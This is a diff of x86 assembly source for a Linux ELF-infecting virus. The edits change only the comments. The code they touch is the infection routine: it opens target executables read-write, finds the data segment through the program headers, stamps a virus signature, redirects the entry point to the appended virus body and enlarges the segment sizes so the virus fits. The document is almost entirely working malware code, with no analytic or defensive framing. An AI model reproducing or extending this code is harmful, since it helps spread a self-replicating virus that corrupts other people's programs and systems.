@@ -142,16 +142,15 @@ return:
     ret
 
 infect:
-    ; let's infect these targets!
     cmp esi, 0
-    jbe v_stop ; there are no targets :( exit
+    jbe v_stop
 
     sub esi, 32
 
     mov eax, 5              ; sys_open
-    mov ebx, edi            ; path
-    add ebx, 1056           ; offset to targets in fake .bss
-    add ebx, esi            ; offset of next filename
+    mov ebx, edi
+    add ebx, 1056
+    add ebx, esi            ; edi + 1056 + esi -> one of terget files
     mov ecx, 2              ; O_RDWR
     int 80h
 
@@ -162,72 +161,64 @@ infect:
 
 reading_loop:
     mov eax, 3              ; sys_read
-    mov edx, 1              ; read 1 byte at a time (yeah, I know this can be optimized)
+    mov edx, 1              ; read 1 byte
     int 80h
 
     cmp eax, 0              ; if this is 0, we've hit EOF
     je reading_eof
     mov eax, edi
-    add eax, 9312           ; 2080 + 7232
-    cmp ecx, eax            ; if the file is over 7232 bytes, let's quit
+    add eax, 9312
+    cmp ecx, eax            ; file > 7232 bytes -> ignore file
     jge infect
     add ecx, 1
     jmp reading_loop
 
 reading_eof:
-    push ecx                ; store address of last byte read. We'll need this later
+    push ecx                ; store address of last byte read
     mov eax, 6              ; close file
     int 80h
 
     xor ecx, ecx
     xor eax, eax
-    mov cx, word [edi+2080+44]     ; ehdr->phnum (number of program header entries)
-    mov eax, dword [edi+2080+28]   ; ehdr->phoff (program header offset)
-    sub ax, word [edi+2080+42]     ; subtract 32 (size of program header entry) to initialize loop
+    mov cx, word [edi+2080+44]     ; number of program header entries
+    mov eax, dword [edi+2080+28]   ; program header offset
+    sub ax, word [edi+2080+42]
 
 program_header_loop:
-    ; loop through program headers and find the data segment (PT_LOAD, offset>0)
+    ; find the data segment (PT_LOAD, offset>0)
 
-    ;0	p_type	type of segment
-    ;+4	p_offset	offset in file where to start the segment at
-    ;+8	p_vaddr	his virtual address in memory
-    ;+c	p_addr	physical address (if relevant, else equ to p_vaddr)
-    ;+10	p_filesz	size of datas read from offset
-    ;+14	p_memsz	size of the segment in memory
-    ;+18	p_flags	segment flags (rwx perms)
-    ;+1c	p_align	alignement
     add ax, word [edi+2080+42]
     cmp ecx, 0
-    jbe infect                  ; couldn't find data segment.  let's close and look for next target
-    sub ecx, 1                  ; decrement our counter by 1
+    jbe infect                          ; data segment not found.
+    sub ecx, 1
 
-    mov ebx, dword [edi+2080+eax]   ; phdr->type (type of segment)
-    cmp ebx, 0x01                   ; 0: PT_NULL, 1: PT_LOAD, ...
-    jne program_header_loop             ; it's not PT_LOAD.  look for next program header
+    mov ebx, dword [edi+2080+eax]       ; phdr->type (type of segment)
+    cmp ebx, 0x01                       ; 0: PT_NULL, 1: PT_LOAD, ...
+    jne program_header_loop             ; not PT_LOAD.  look for next program header
 
     mov ebx, dword [edi+2080+eax+4]     ; phdr->offset (offset of program header)
-    cmp ebx, 0x00                       ; if it's 0, it's the text segment.  Otherwise, we found the data segment
-    je program_header_loop              ; it's the text segment.  We're interested in the data segment
+    cmp ebx, 0x00                       ; if > 0 -> data segment
+    je program_header_loop
 
     mov ebx, dword [edi+2080+24]        ; old entry point
     push ebx                            ; save the old entry point
-    mov ebx, dword [edi+2080+eax+4]     ; phdr->offset (offset of program header)
-    mov edx, dword [edi+2080+eax+16]    ; phdr->filesz (size of segment on disk)
-    add ebx, edx                        ; offset of where our virus should reside = phdr[data]->offset + p[data]->filesz
-    push ebx                            ; save the offset of our virus
-    mov ebx, dword [edi+2080+eax+8]     ; phdr->vaddr (virtual address in memory)
-    add ebx, edx        ; new entry point = phdr[data]->vaddr + p[data]->filesz
+    mov ebx, dword [edi+2080+eax+4]     ; offset of program header
+    mov edx, dword [edi+2080+eax+16]    ; size of segment on disk
+    add ebx, edx                        ; offset of virus
+    push ebx
+    mov ebx, dword [edi+2080+eax+8]     ; virtual address in memory
+    add ebx, edx                        ; new entry point
 
-    mov ecx, 0x001edd0e     ; insert our signature at byte 8 (unused section of the ELF header)
+    mov ecx, 0x001edd0e                 ; insert virus signature at byte 8
     mov [edi+2080+8], ecx
-    mov [edi+2080+24], ebx  ; overwrite the old entry point with the virus (in buffer)
-    add edx, v_stop - v_start   ; add size of our virus to phdr->filesz
-    add edx, 7                  ; for the jmp to original entry point
-    mov [edi+2080+eax+16], edx  ; overwrite the old phdr->filesz with the new one (in buffer)
-    mov ebx, dword [edi+2080+eax+20]    ; phdr->memsz (size of segment in memory)
-    add ebx, v_stop - v_start   ; add size of our virus to phdr->memsz
-    add ebx, 7                  ; for the jmp to original entry point
-    mov [edi+2080+eax+20], ebx  ; overwrite the old phdr->memsz with the new one (in buffer)
+    mov [edi+2080+24], ebx              ; overwrite the old entry point with the virus (in buffer)
+    add edx, v_stop - v_start
+    add edx, 7
+    mov [edi+2080+eax+16], edx          ; override the file size
+    mov ebx, dword [edi+2080+eax+20]
+    add ebx, v_stop - v_start
+    add ebx, 7
+    mov [edi+2080+eax+20], ebx          ; override the memsize
 
     xor ecx, ecx
     xor eax, eax
